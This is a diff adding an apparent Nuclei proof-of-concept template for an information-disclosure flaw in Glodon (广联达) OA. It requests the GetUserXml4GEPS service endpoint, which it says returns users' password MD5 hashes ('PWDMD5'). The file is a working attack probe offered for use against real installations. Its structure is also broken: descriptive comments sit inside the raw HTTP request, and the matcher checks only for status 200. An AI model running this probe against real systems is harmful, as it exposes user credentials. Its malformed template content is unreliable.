@@ -1,0 +1,34 @@
+id: poc-hxsw76dhnqwaidmp
+info:
+  name: 广联达OA信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hxsw76dhnqwaidmp'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hxsw76dhnqwaidmp
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /Org/service/Service.asmx/GetUserXml4GEPS HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    PWDMD5
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
